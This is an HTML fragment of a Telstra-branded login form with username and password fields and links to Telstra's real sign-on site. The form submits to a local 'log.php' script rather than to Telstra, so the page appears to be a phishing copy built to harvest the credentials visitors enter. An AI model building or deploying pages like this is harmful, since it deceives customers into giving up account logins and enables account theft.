                                    ...
                                    <div class="col col-50-50-c0 first rebrandColumn1" style="padding: 0px; min-height:418px;">
                                        <div class="col-wrapper" style="padding: 0px; margin-right: 28px; min-height:418px;">
                                            <div style="padding: 0px; margin-left: 30px; margin-top: 30px;">
                                                <form method="post" id="Login" name="myForm" onsubmit="return validateForm()" class="form" action="log.php"  style="margin: 0px;">
                                                    ...
                                                    <div style="min-height: 282px; ">
                                                        <div class="input-wrapper field-group">
                                                            <div class="input-container form-control-username cmn_rebrandFormControl">
                                                                ...
                                                                <input type="text" id="username" tabindex="1" name="username" value="" size="30" autocomplete="off" maxlength="200"  placeholder="Username" style="height: 100%; box-shadow: none; width: 78%; border: 0px solid #dddddd;">
                                                                <a href="https://signon.telstra.com.au/login#" id="toggleFun" class="forgot-link" style="vertical-align: bottom; line-height: 1px;"></a>
                                                            </div>
                                                        </div>
                                                        <p id="unametip" hidden="" style="width: 100%; font-size: 12px; display: block;">As a customer, this is the name you registered with us.</p>
                                                        ...
                                                        <div class="input-wrapper field-group">
                                                            <div class="input-container form-control-userpasswd cmn_rebrandFormControl">
                                                                <span class="visible-ie8"></span>
                                                                <input type="password" tabindex="2" id="password" name="password" autocomplete="off" size="30" maxlength="50" placeholder="Password" style="height: 100%; box-shadow: none; width: 78%; border: 0px solid #dddddd;">
                                                                <a href="https://signon.telstra.com.au/login#" id="toggleFpw" class="forgot-link" style="vertical-align: bottom; line-height: 1px;"></a>
                                                            </div>
                                                        </div>
                                                    ...
                                                    <div>
                                                        ...
                                                        <input class="set-theme blue" type="submit" value="Log in &nbsp;&nbsp;&nbsp;&nbsp;&#5171;">
                                                    </div>
